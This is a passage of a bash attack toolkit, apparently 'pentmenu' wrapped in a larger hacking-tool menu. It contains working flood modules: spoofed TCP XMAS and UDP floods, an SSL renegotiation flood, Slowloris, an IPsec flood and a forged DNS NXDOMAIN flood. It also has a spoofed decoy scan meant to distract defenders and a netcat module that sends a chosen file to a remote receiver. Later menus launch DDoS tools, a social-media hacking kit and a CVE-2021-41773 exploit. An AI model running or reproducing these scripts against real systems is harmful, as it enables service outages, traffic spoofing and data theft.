	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP XMAS flood using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --spoof $SOURCE -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --rand-source -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	fi
#No hping3 so using nping for TCP RST Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP XMAS Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP XMAS Flood..."
#begin TCP RST flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPXMASFLOOD##
###################

##################
##START UDPFLOOD##
udpflood()
{ echo "UDP Flood uses hping3...checking for hping3..."
#check for hping on the local system
if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for UDP Flood
#need a valid target IP/hostname
	echo "Enter target:"
		read -i $TARGET -e TARGET
#need a valid target UDP port
	echo "Enter target port (defaults to 80):"
		read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
	echo "Enter random string (data to send):"
		read DATA
#what source IP should we write to sent packets?
	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
		read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#start the attack using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
#if no valid source option is selected, use outgoing interface IP
	else echo "Not a valid option!  Using interface IP"
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
	fi
#If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying UDP Flood with nping.."
		echo "Enter target:"
#need a valid target IP/hostname
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
#need a port to send UDP packets to
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what source address should we use in sent packets?
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#how many packets should we try to send each second?
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets should we send in total?
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
#default values will send 10k packets each second, for 10 seconds
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
		echo "Enter string to send (data):"
	read DATA
		echo "Starting UDP Flood..."
#start the UDP flood using values we defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
fi
}
##END UDPFLOOD##
################

################
##START SSLDOS##
ssldos()
{ echo "Using openssl for SSL/TLS DOS"
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a target port
		echo "Enter target port (defaults to 443):"
read -i $PORT -e PORT
: ${PORT:=443}
#check a valid target port is entered otherwise assume port 443
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
	PORT=443 && echo "You provided a string, not a port number!  Reverting to port 443"
fi
if [ "$PORT" -lt "1" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
elif [ "$PORT" -gt "65535" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
else echo "Using port $PORT"
fi
#do we want to use client renegotiation?
	echo "Use client renegotiation? [y]es or [n]o (default):"
read NEGOTIATE
: ${NEGOTIATE:=n}
if [[ $NEGOTIATE = y ]]; then
#if client renegotiation is selected for use, launch the attack supporting it
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
elif [[ $NEGOTIATE = n ]]; then
#if client renegotiation is not requested, lauch the attack without support for it
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
#if an invalid option is chosen for client renegotiation, launch the attack without it
else
	echo "Invalid option, assuming no client renegotiation"
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
fi
#The SSL/TLS DOS code is crude but it can be brutally effective
}
##END SSLDOS##
##############

##################
##START SLOWLORIS##
slowloris()
{ echo "Using netcat for Slowloris attack...." && sleep 1
echo "Enter target:"
#need a target IP or hostname
	read -i $TARGET -e TARGET
echo "Target is set to $TARGET"
#need a target port
echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#how many connections should we attempt to open with the target?
#there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
echo "Enter number of connections to open (default 2000):"
		read CONNS
	: ${CONNS:=2000}
#ensure a valid integer is entered
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=2000 && echo "Invalid integer!  Using 2000 connections"
	fi
#how long do we wait between sending header lines?
#too long and the connection will likely be closed
#too short and our connections have little/no effect on server
#either too long or too short is bad.  Default random interval is a sane choice
echo "Choose interval between sending headers."
echo "Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
#if default (random) interval is chosen, generate a random value between 5 and 15
#note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
INTERVAL=$((RANDOM % 11 + 5))
#check that r (random) or a valid number is entered
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
#if not r (random) or valid number is chosen for interval, assume r (random)
INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
	fi
#run stunnel_client function
stunnel_client
if [[ "$SSL" = "y" ]]
then
#if SSL is chosen, set the attack to go through local stunnel listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "Opened $CONNS connections....returning to menu"
else
#if SSL is not chosen, launch the attack on the server without using a local listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
#return to menu once requested number of connections has been opened or resources are exhausted
echo "Opened $CONNS connections....returning to menu"
fi
}
##END SLOWLORIS##
#################

###################
##START IPSEC DOS##
ipsecdos()
{ echo "This module will attempt to spoof an IPsec server, with a spoofed source address"
echo "Enter target IP or hostname:"
read -i $TARGET -e TARGET
#launch DOS with a random source address by default
echo "IPsec DOS underway...use 'Ctrl C' to stop" &&
while :
do sudo ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; sudo ike-scan -B 100M -t 1 -q --sourceip=random $TARGET 1>/dev/null
done
}
##END IPSEC DOS##
#################

#####################
##START DISTRACTION##
distractionscan()
{ echo "This module will send a TCP SYN scan with a spoofed source address"
echo "This module is designed to be obvious, to distract your target from any real scan or other activity you may actually be performing"
echo "Enter target:"
#need target IP/hostname
read -i $TARGET -e TARGET
echo "Enter spoofed source address:"
#need a spoofed source address
read -i $SOURCE -e SOURCE
#use hping to perform multiple obvious TCP SYN scans
for i in {1..50}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
exit 0
}
##END DISTRACTION##
###################

#######################
##START NXDOMAINFLOOD##
nxdomainflood()
{ echo "This module is designed to stress test a DNS server by flooding it with queries for domains that do not exist"
echo "Enter the IP address of the target DNS server:"
read -i $DNSTARGET -e DNSTARGET
echo "Starting DNS NXDOMAIN Query Flood to $DNSTARGET" && sleep 1
echo "No output will be shown. Use 'Ctrl c' to stop!"
#loop forever!
while :
do
#create transaction ID for DNS query
TRANS=$RANDOM
#convert to hex
printf -v TRANSID "%x\n" "$TRANS"
#cut it into bytes
TRANSID1=$(echo $TRANSID|cut -b 1,2|xargs)
TRANSID2=$(echo $TRANSID|cut -b 3,4|xargs)
#if single byte or no byte, prepend 0
if [[ ${#TRANSID1} = "1" ]]
then
TRANSID1=0$TRANSID
elif [[ ${#TRANSID2} = "0" ]]
then
TRANSID2=00
elif [[ ${#TRANSID2} = "1" ]] 
then
TRANSID2=0$TRANSID
fi
#now we have transaction ID, generate random alphanumeric name to query
TLDLIST=(com br net org cz au co jp cn ru in ir ua ca xyz site top icu vip online de $RANDOM foo)
TLD=(${TLDLIST[RANDOM%22]})
RANDLONG=$((RANDOM % 20 +1))
STRING=$(< /dev/urandom tr -dc [:alnum:] | head -c$RANDLONG)
#calculate length of name we are querying as hex
STRINGLEN=(${#STRING})
printf -v STRINGLENHEX "%x\n" "$STRINGLEN"
STRINGLENHEX=$(echo $STRINGLENHEX|xargs)
if [[ ${#STRINGLENHEX} = "1" ]]
then 
STRINGLENHEX=0$STRINGLENHEX
fi
#do the same for TLD
TLDLEN=(${#TLD})
printf -v TLDLENHEX "%x\n" "$TLDLEN"
TLDLENHEX=$(echo $TLDLENHEX|xargs)
#forge a DNS request and send to netcat
ATTACKSTRING="\x$TRANSID1\x$TRANSID2\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x$STRINGLENHEX$STRING\x$TLDLENHEX$TLD\x00\x00\x01\x00\x01"
#echo $ATTACKSTRING
echo -n -e $ATTACKSTRING | nc -u -w0 $DNSTARGET 53
done
exit 0
}
##END NXDOMAINFLOOD##
#####################

##/DOS##


##EXTRACTION##
########################
##START EXTRACTIONMENU##
extractionmenu()
{
#display a menu for the extraction module using bash select
        extractionmenu=("Send File" "Create Listener" "Go back")
    select extractopt in "${extractionmenu[@]}"; do
#Extract file with TCP or UDP
    if [ "$extractopt" = "Send File" ]; then
        sendfile
#Create an arbitrary listener to receive files
    elif [ "$extractopt" = "Create Listener" ]; then
		listener
#Go back
    elif [ "$extractopt" = "Go back" ]; then
        mainmenu
#Default error if no valid option is chosen
    else
        echo "That's not a valid option! Hit Return to show menu"
    fi
    done
}
##END EXTRACTIONMENU##
######################

##################
##START SENDFILE##
sendfile()
	{ echo "This module will allow you to send a file over TCP or UDP"
	echo "You can use the Listener to receive such a file"
echo "Enter protocol, [t]cp (default) or [u]dp:"
	read -i $PROTO -e PROTO
	: ${PROTO:=t}
#if not t (tcp) or u (udp) is chosen, assume tcp required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
fi
echo "Enter the IP of the receving server:"
#need to know the IP of the receiving end
  read -i $RECEIVER -e RECEIVER
#need to know a destination port on the server
  echo "Enter port number for the destination server (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what file are we sending?
  echo "Enter the FULL PATH of the file you want to extract:"
  read -i $EXTRACT -e EXTRACT
#send the file
echo "Sending the file to $RECEIVER:$PORT"
if [ "$PROTO" = "t" ]; then
nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
else
nc -n -N -u $RECEIVER $PORT < $EXTRACT
fi
echo "Done"
#generate hashes of file we are sending
echo "Generating hash checksums"
md5sum $EXTRACT
echo ""
sha512sum $EXTRACT
sleep 1
}
##END SENDFILE##
################

##################
##START LISTENER##
listener()
	{ echo "This module will create a TCP or UDP listener using netcat"
	echo "Any data (string or file) received will be written out to ./pentmenu.listener.out"
echo "Enter protocol, [t]cp (default) or [u]dp:"
	read -i $PROTO -e PROTO
	: ${PROTO:=t}
#if not t (tcp) or u (udp) is chosen, assume tcp listener required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
fi
#show listening ports on system using ss (if available) otherwise use netstat
	echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
if test -f "/bin/ss"; then
	LISTPORT=ss;
	else LISTPORT=netstat

fi
#now we can ask what port to create listener on
#it cannot of course listen on a port already in use
	$LISTPORT -$PROTO -n -l
echo "Enter port number to listen on (defaults to 8000):"
	read -i $PORT -e PORT
	: ${PORT:=8000}
#if not an integer is entered, assume default port 8000
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
		PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
fi
#ensure a valid port number, between 1 and 65,535 (inclusive) is entered
if [ "$PORT" -lt "1" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
	elif [ "$PORT" -gt "65535" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
fi
#define where to save everything received to the listener
echo "Enter output file (defaults to pentmenu.listener.out):"
	read -i $OUTFILE -e OUTFILE
	: ${OUTFILE:=pentmenu.listener.out}
echo "Use ctrl c to stop"
#create the listener
if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -n -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -n -u -k -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -u -k -l -v -p $PORT > $OUTFILE
fi
#done message and checksums will only work for tcp file transfer
#with udp, the connection has to be manually closed with 'ctrl C'
sync && echo "Done"
#generate hashes of file received
echo "Generating hash checksums"
md5sum $OUTFILE
echo ""
sha512sum $OUTFILE
sleep 1
}
##END LISTENER##
################
##/EXTRACTION##


##README##
####################
##START SHOWREADME##
showreadme()
#use curl to show the readme file
#i should probably add a check for a local copy
{
curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
}
##END SHOWREADME##
##################
##/README##


##GENERIC##
#################
##START STUNNEL##
stunnel_client()
{ echo "use SSL/TLS? [y]es or [n]o (default):"
	read SSL
	: ${SSL:=n}
#if not using SSL/TLS, carry on what we were doing
#otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
if [[ "$SSL" = "y" ]]
	then echo "Using SSL/TLS"
LHOST=127.0.0.1
LPORT=9991
#ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
grep -q $LPORT /etc/services
if [[ $? = 1 ]]
then
echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
fi
#is ss is available, use that to shoew listening ports
if test -f "/bin/ss"; then
	LISTPORT=ss;
#otherwise use netstat
	else LISTPORT=netstat
fi
#show listening ports and check for port 9991
$LISTPORT -tln |grep -q $LPORT
if [[ "$?" = "1" ]]
#if nothing is running on port 9991, create stunnel configuration
then
	echo "Creating stunnel client on $LHOST:$LPORT"
		sudo rm -f /etc/stunnel/pentmenu.conf;
		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
		sudo chmod 644 /etc/stunnel/pentmenu.conf
		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
#if stunnel listener is already active we don't bother recreating it
else echo "Looks like stunnel is already listening on port 9991, so not recreating"
fi
fi }
##END STUNNEL##
###############
##/GENERIC##


##WELCOME##
#########################
##START WELCOME MESSAGE##
#everything before this is a function and functions have to be defined before they can be used
#so the welcome message MUST be placed at the end of the script
	clear && echo ""
echo " ________ _______  _       _________ _______  ________  _                "
echo "|  ____  ||  ____ \| \    /|\__   __/|       ||  ____ \| \    /||\     /|"
echo "| |    | || |    \/|  \  | |   | |   | || || || |    \/|  \  | || |   | |"
echo "| |____| || |__    |   \ | |   | |   | || || || |__    |   \ | || |   | |"
echo "|  ______||  __)   | |\ \| |   | |   | ||_|| ||  __)   | |\ \| || |   | |"
echo "| |       | |      | | \   |   | |   | |   | || |      | | \   || |   | |"
echo "| |       | |____/\| |  \  |   | |   | |   | || |____/\| |  \  || |___| |"
echo "|/        (_______/|/    \_|   |_|   |/     \||_______/|/    \_||_______|"
echo ""
echo "Welcome to pentmenu!"
echo "Please report all bugs, improvements and suggestions to https://github.com/rap0at/bashNmap"
echo "This software is only for responsible, authorised use."
echo "YOU are responsible for your own actions!"
echo ""
mainmenu
##END WELCOME MESSAGE##
#######################
##/WELCOME##                    
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit3

if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
SocialMediaHackingToolkit() {
    #!/bin/bash
xterm -e python3 cmd/main.py
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit3

if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

Fakedatagen() {
    banner
    xterm -e bash -c '
        python3 FakeDataGen.py
        read -p "Press Enter to close this window..." input
    ' &

    printf "\e[0m\n"
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
    printf "\e[0m\n"

    while true; do
        read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit3

        if [[ $mainorexit3 == 1 || $mainorexit3 == 01 ]]; then
            killall xterm
            banner
            menu
        elif [[ $mainorexit3 == 2 || $mainorexit3 == 02 ]]; then
            killall xterm
            printf "\e[0m\n"
            printf "\e[0m\n"
            exit 1
        else
            printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
            sleep 1
            banner
            menu
        fi
    done
}





GoldenEye() {
    banner
    xterm -e "bash -c 'python3 goldeneye.py -h; read -p \"Press Enter to close this window...\" input'" &

    printf "\e[0m\n"
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
    printf "\e[0m\n"

    while true; do
        read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit3

        if [[ $mainorexit3 == 1 || $mainorexit3 == 01 ]]; then
            killall xterm
            banner
            menu
        elif [[ $mainorexit3 == 2 || $mainorexit3 == 02 ]]; then
            killall xterm
            printf "\e[0m\n"
            printf "\e[0m\n"
            exit 1
        else
            printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
            sleep 1
            banner
            menu
        fi
    done
}

Impulse() {
    banner
    xterm -e "bash -c 'python3 impulse.py -h; read -p \"Press Enter to close this window...\" input'" &

    printf "\e[0m\n"
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
    printf "\e[0m\n"

    while true; do
        read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit3

        if [[ $mainorexit3 == 1 || $mainorexit3 == 01 ]]; then
            killall xterm
            banner
            menu
        elif [[ $mainorexit3 == 2 || $mainorexit3 == 02 ]]; then
            killall xterm
            printf "\e[0m\n"
            printf "\e[0m\n"
            exit 1
        else
            printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
            sleep 1
            banner
            menu
        fi
    done
}

Web(){
	banner
	printf "\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m01\e[0m\e[1;31m]\e[0m\e[1;33m Xlsninja\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m02\e[0m\e[1;31m]\e[0m\e[1;33m 4-zero-3\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m03\e[0m\e[1;31m]\e[0m\e[1;33m MagicRecon\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m04\e[0m\e[1;31m]\e[0m\e[1;33m SpyHunt\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m05\e[0m\e[1;31m]\e[0m\e[1;33m jok3r\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m06\e[0m\e[1;31m]\e[0m\e[1;33m Ip-Rover\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m07\e[0m\e[1;31m]\e[0m\e[1;33m Http-Smuggling\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m08\e[0m\e[1;31m]\e[0m\e[1;33m CVE-2021-41773\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m09\e[0m\e[1;31m]\e[0m\e[1;33m Nginxpwner\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m10\e[0m\e[1;31m]\e[0m\e[1;33m autoreport\e[0m\n"
	printf "\e[0m\n"
	read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select An Option \e[0m\e[1;96m: \e[0m\e[1;93m' option

if [[ $option == 1 || $option == 01 ]]; then
    Xlsninja
elif [[ $option == 2 || $option == 02 ]]; then
    4-zero-3
elif [[ $option == 3 || $option == 03 ]]; then
    MagicRecon
elif [[ $option == 4 || $option == 04 ]]; then
    SpyHunt
elif [[ $option == 5 || $option == 05 ]]; then
	jok3r
elif [[ $option == 6 || $option == 06 ]]; then
	Ip-Rover	
elif [[ $option == 7 || $option == 07 ]]; then
	Http-Smuggling	
elif [[ $option == 8 || $option == 08 ]]; then
	CVE-2021-41773
